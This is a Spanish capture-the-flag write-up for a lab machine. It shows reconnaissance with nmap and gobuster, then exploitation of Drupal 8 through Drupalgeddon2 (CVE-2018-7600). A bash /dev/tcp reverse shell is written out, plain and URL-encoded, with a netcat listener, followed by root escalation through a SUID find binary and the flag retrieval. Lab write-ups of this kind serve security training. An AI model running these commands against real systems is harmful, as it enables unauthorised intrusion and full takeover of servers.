# Ejotapete

## 1. Reconocimiento Inicial con Nmap

El primer paso en cualquier ejercicio es el reconocimiento.

```bash
nmap -sC -sV --open 172.17.0.2
```

*   `-sC`: Realiza un escaneo con scripts por defecto. Estos scripts son útiles para la detección de vulnerabilidades comunes y la enumeración de servicios.
*   `-sV`: Intenta determinar la versión del servicio que se ejecuta en cada puerto abierto.
*   `--open`: Muestra solo los puertos que están abiertos.

### Resultado del Escaneo Nmap

```
PORT   STATE SERVICE VERSION  
80/tcp open  http    Apache httpd 2.4.25  
|_http-server-header: Apache/2.4.25 (Debian)  
|_http-title: 403 Forbidden  
MAC Address: 02:42:AC:11:00:02 (Unknown)  
Service Info: Host: 172.17.0.2
```

Como se observa en la salida, el puerto 80 está abierto y ejecuta un servidor web Apache httpd versión 2.4.25. Sin embargo, al intentar acceder a la página principal, se obtiene un error `403 Forbidden`, lo que indica que no tenemos permiso para acceder al directorio raíz del servidor web. Esto sugiere que el contenido relevante podría estar en un subdirectorio o que se requiere autenticación.

## 2. Enumeración de Directorios con Gobuster

Dado el error `403 Forbidden`, el siguiente paso lógico es realizar una enumeración de directorios para descubrir posibles rutas ocultas o no listadas en el servidor web. Para esto, utilizamos `gobuster`.

### Comando Gobuster (Primera Fase)

```bash
gobuster dir -w /home/eduard/WordList/directories.txt -u http://172.17.0.2
```

### Resultado de Gobuster (Primera Fase)

```bash
/drupal               (Status: 301) [Size: 309] [--> http://172.17.0.2/drupal/]
```

 Esto es un hallazgo significativo, ya que indica la presencia de una aplicación Drupal en el servidor.

### Inspección y Fuzzing Adicional en /drupal

Una vez identificado el directorio `/drupal`, es crucial inspeccionar su contenido y realizar un fuzzing más profundo dentro de esta ruta para descubrir más recursos. 

![[Ejotapete_Drupal.png]]
### Comando Gobuster (Segunda Fase)

```bash
gobuster dir -w /home/eduard/WordList/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2/drupal
```
Se listaron varias rutas adicionales, como `/drupal/user/login`, `/drupal/core/themes/bartik/logo.svg`, etc. Sin embargo, se determinó que ninguna de estas rutas proporcionaba información útil para la explotación directa en ese momento.

### Inspeccionar el código fuente
Al inspeccionar el código de `/drupal` encontramos el siguiente comentario:

```txt
[if lte IE 8]>
<script src="/drupal/sites/default/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js"></script>
<![endif]
```

Este comentario hace referencia a `html5shiv` (versión 3.7.3), una librería JavaScript utilizada para habilitar elementos HTML5 en navegadores antiguos (como Internet Explorer 8 o inferior). Aunque no es una vulnerabilidad directa, puede indicar la antigüedad de la instalación de Drupal, lo que podría ser relevante para la identificación de vulnerabilidades.

## 3. Identificación de Versiones y Búsqueda de Vulnerabilidades

```bash
whatweb 172.17.0.2/drupal
```

### Salida de Whatweb

```
 Summary   : Apache[2.4.25], Content-Language[en], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)],  
MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, UncommonHeaders[x-drupal-d  
ynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.  
3], X-UA-Compatible[IE=edge]
```

Nos confirma que la aplicación es **Drupal 8** y que el servidor Apache es la versión **2.4.25**, con PHP **7.2.3**. Con esta información, podemos buscar vulnerabilidades conocidas utilizando `searchsploit`

### Búsqueda de Exploits con Searchsploit

```bash
searchsploit apache 2.4.25
searchsploit drupal 8
```

Al buscar exploits para 


Apache 2.4.25 y Drupal 8, la búsqueda para Drupal 8 es la más prometedora. Específicamente, el exploit `44449.rb` para **Drupalgeddon2** (CVE-2018-7600) es el relevante para esta versión de Drupal.

## 4. Explotación de Drupal (Drupalgeddon2 - CVE-2018-7600)

La vulnerabilidad **Drupalgeddon2** (CVE-2018-7600) es una vulnerabilidad de ejecución remota de código (RCE) crítica que afecta a varias versiones de Drupal, incluyendo Drupal 8.x. Esta vulnerabilidad permite a un atacante ejecutar código en el servidor web sin autenticación, simplemente enviando una solicitud especialmente diseñada.

### Descarga y Preparación del Exploit

El exploit se descarga de Exploit-DB (https://www.exploit-db.com/exploits/44449). Una vez descargado, se le otorgan permisos de ejecución y se instala una dependencia necesaria.

```bash
chmod 700 44449.rb
gem install highline # instalamos esta dependencia
ruby 44449.rb http://172.17.0.2/drupal/ # ejecutamos el exploit
```

### Obtención de Ejecución Remota de Comandos (RCE)

Tras la ejecución exitosa del exploit, se obtiene una shell en el servidor. ![[Ejotapete_Drupal_ReverseSell.png]]

```bash
whoami # www-data
```

La salida `www-data` indica que hemos obtenido una shell como el usuario del servidor web. Éste  tiene privilegios limitados. El siguiente paso es establecer una `reverse shell` para tener una conexión más estable y funcional con la máquina atacante.

## 5. Establecimiento de una Reverse Shell

Una `reverse shell` es una técnica en la que la máquina objetivo inicia una conexión de vuelta a la máquina del atacante, lo que permite al atacante ejecutar comandos de forma interactiva. Esto es preferible a una `bind shell` (donde el atacante se conecta a un puerto abierto en la máquina objetivo) porque a menudo las redes tienen firewalls que bloquean las conexiones entrantes, pero permiten las salientes.

### Preparación de la Reverse Shell

Se utiliza una `bash reverse shell` que se codifica en URL para poder ser ejecutada a través de la shell obtenida en el paso anterior. En la máquina atacante, se configura un `listener` con `netcat` para recibir la conexión entrante.

**Comando de Reverse Shell (codificado en URL):**

```bash
bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
```

*   `bash -i`: Abre una shell interactiva de bash.
*   `>& /dev/tcp/172.17.0.1/443`: Redirige tanto la salida estándar (`stdout`) como la salida de error estándar (`stderr`) a un socket TCP que se conecta a la IP `172.17.0.1` (la IP de la máquina atacante) en el puerto `443`.
*   `0>&1`: Redirige la entrada estándar (`stdin`) al mismo socket, haciendo que la shell sea completamente interactiva.

**Codificación URL:**

Para ejecutar este comando a través de una interfaz web o un exploit que maneje URLs, es común codificarlo. Herramientas como `https://www.urlencoder.org/` se utilizan para este propósito. El comando codificado sería:

```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%27
```

**Listener en la Máquina Atacante:**

En una terminal separada en la máquina atacante, se inicia un `listener` de `netcat` en el puerto especificado (en este caso, 443).

```bash
nc -nvlp 443
```

Una vez que el comando codificado se ejecuta en la máquina objetivo, la `reverse shell` se conectará al `listener` de `netcat`, proporcionando una shell interactiva y estable.

## 6. Escalada de Privilegios con Binarios SUID

Después de obtener una shell inicial como un usuario de bajos privilegios (`www-data`), el siguiente objetivo es escalar privilegios a `root`. Una técnica común es buscar binarios con el bit SUID (Set User ID) activado. Cuando un programa con el bit SUID activado es ejecutado por un usuario, se ejecuta con los permisos del propietario del archivo, no con los del usuario que lo ejecuta. Si el propietario es `root`, el programa se ejecutará con privilegios de `root`.

### Búsqueda de Binarios SUID

Se utiliza el comando `find` para buscar archivos con el bit SUID activado en todo el sistema de archivos.

```bash
find / -perm -4000 -ls 2>/dev/null
```

### Salida de la Búsqueda SUID

```
77718566     44 -rwsr-xr-x   1 root     root        44304 Mar  7  2018 /bin/mount  
77718582     40 -rwsr-xr-x   1 root     root        40536 May 17  2017 /bin/su  
77718589     32 -rwsr-xr-x   1 root     root        31720 Mar  7  2018 /bin/umount  
76244841     52 -rwsr-xr-x   1 root     root        50040 May 17  2017 /usr/bin/chfn  
76244843     40 -rwsr-xr-x   1 root     root        40504 May 17  2017 /usr/bin/chsh  
76694335    220 -rwsr-xr-x   1 root     root       221768 Feb 18  2017 /usr/bin/find  
76381719     76 -rwsr-xr-x   1 root     root        75792 May 17  2017 /usr/bin/gpasswd  
76419523     40 -rwsr-xr-x   1 root     root        40312 May 17  2017 /usr/bin/newgrp  
76419534     60 -rwsr-xr-x   1 root     root        59680 May 17  2017 /usr/bin/passwd  
42369695    140 -rwsr-xr-x   1 root     root       140944 Jan 23  2021 /usr/bin/sudo
```

Entre los binarios listados, `find` (`/usr/bin/find`) puede ejecutar comandos externos (`-exec`) con los privilegios del propietario del archivo (en este caso, `root`).

### Explotación de `find` para Escalada de Privilegios

Para explotar el binario `find` con SUID, se utiliza el siguiente comando:

```bash
find . -exec /bin/bash -p \; -quit
```

Al ejecutar este comando, la terminal puede parecer que se queda "pillada" o no responde, pero en realidad, ya se ha obtenido una shell con privilegios de `root`.

### Verificación de Privilegios

Para confirmar que la escalada de privilegios ha sido exitosa, se ejecuta nuevamente el comando `whoami`:

```bash
whoami  
root
```

La salida `root` confirma que hemos obtenido acceso como el usuario `root`, lo que significa que tenemos control total sobre el sistema.

## 7. Obtención de la Flag Final

Una vez con privilegios de `root`, el último paso en este tipo de ejercicios es encontrar la "flag" o el archivo objetivo que demuestra la finalización del desafío. Generalmente, estos archivos se encuentran en directorios protegidos, como `/root`.

### Navegación y Recuperación de la Flag

```bash
cd /root  
ls  
secretitomaximo.txt  
cat secretitomaximo.txt  
nobodycanfindthispasswordrootrocks
```
